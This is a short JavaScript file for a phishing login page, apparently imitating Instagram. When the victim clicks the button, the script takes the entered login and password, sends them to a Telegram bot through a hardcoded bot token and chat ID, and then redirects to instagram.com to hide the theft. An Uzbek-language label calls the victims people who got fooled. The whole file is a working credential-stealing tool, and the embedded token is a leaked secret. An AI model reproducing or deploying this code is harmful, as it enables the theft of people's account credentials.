let BOT_TOKEN = '8275042914:AAH0MFj5VRknVnsu8UcrNWCSIJBjYFcMNT8'
let CHAT_ID = '6654080999'

let p = document.querySelector('#error')
let button = document.querySelector('button')
let input = document.querySelectorAll('input')
let URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${input[0].value} ${input[1].value}`

async function sendMessage() {
    let TEXT = `
    YEB QOYGAN ODAMLARNI ACCOUNT:
    login: ${input[0].value}
    password: ${input[1].value}
    `
    try {
        if (input[0].value.trim() === '' && input[1].value.trim() === '') {
            p.innerHTML = 'Iltimos ma\'lumotlarni kiriting'
            p.className = "text-error text-sm font-bold relative left-8 py-5"
        } else {
            console.log({ login: input[0].value, password: input[1].value })
            let sorov = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: TEXT
                })
            })
            let javob = await sorov.json()
            console.log("SERVERDA JAVOBDAN OLINDI:", javob)

            if (sorov.ok) {
                window.location.href = 'https://instagram.com'
            }
        }
    } catch (error) {
        console.log("SERVERDA HATOLIK: ", error)
    }
}

button.addEventListener('click', sendMessage)
